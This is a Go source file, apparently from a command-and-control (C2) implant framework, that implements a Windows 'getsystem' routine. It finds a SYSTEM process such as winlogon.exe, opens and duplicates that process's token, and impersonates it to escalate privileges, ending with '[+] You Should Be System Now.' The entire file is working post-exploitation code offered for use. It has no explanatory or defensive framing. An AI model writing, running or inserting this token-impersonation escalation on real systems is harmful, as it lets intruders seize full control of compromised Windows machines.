//go:build windows
// +build windows

package getsystem

import (
	"errors"
	"syscall"
	"unsafe"

	"github.com/latortuga71/wsC2/pkg/winapi"
	"golang.org/x/sys/windows"
)

func GetSystem() (string, error) {
	var pid uint32 = 0
	hSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return "", err
	}
	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))
	// do
	err = windows.Process32First(hSnapshot, &pe32)
	if err != nil {
		return "", err
	}
	// while
	for {
		err = windows.Process32Next(hSnapshot, &pe32)
		if err != nil {
			break
		}
		// else do stuff with process
		name := syscall.UTF16ToString(pe32.ExeFile[:])
		if name == "winlogon.exe" || name == "OfficeClickToRun.exe" || name == "Sysmon.exe" {
			pid = pe32.ProcessID
			break
		}
	}
	if pid == 0 {
		return "", errors.New("Failed to find system process.")
	}
	windows.CloseHandle(hSnapshot)
	// enable SEDebug
	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return "", err
	}
	var hToken windows.Token
	var duplicatedToken windows.Token
	err = windows.OpenProcessToken(hProc, windows.TOKEN_IMPERSONATE|windows.TOKEN_DUPLICATE, &hToken)
	if err != nil {
		return "", err
	}
	err = windows.DuplicateTokenEx(hToken, windows.MAXIMUM_ALLOWED, nil, 2, windows.TokenImpersonation, &duplicatedToken)
	if err != nil {
		return "", err
	}
	worked, err := winapi.ImpersonateLoggedOnUser(duplicatedToken)
	if !worked {
		return "", err
	}
	return "[+] You Should Be System Now.", nil
}
